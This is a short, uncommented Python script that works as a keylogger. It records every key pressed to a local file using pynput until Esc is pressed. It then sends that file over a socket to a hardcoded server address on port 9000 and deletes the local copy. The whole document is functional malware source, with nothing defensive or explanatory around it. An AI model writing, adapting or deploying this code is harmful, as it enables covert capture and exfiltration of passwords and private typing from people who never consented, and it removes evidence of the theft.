```python
import os
import socket
import time
from pynput import keyboard

log_file = 'keylogs.txt'
server_ip = '192.168.122.182'
port = 9000

def send_to_server(file):
    with socket.socket() as s:
        s.connect((server_ip, port))
        with open(file, 'rb') as f:
            data = f.read(1024)
            while data:
                s.sendall(data)
                data = f.read(1024)
    os.remove(file)

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(str(key))
    except Exception as e:
        print(e)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

send_to_server(log_file)
```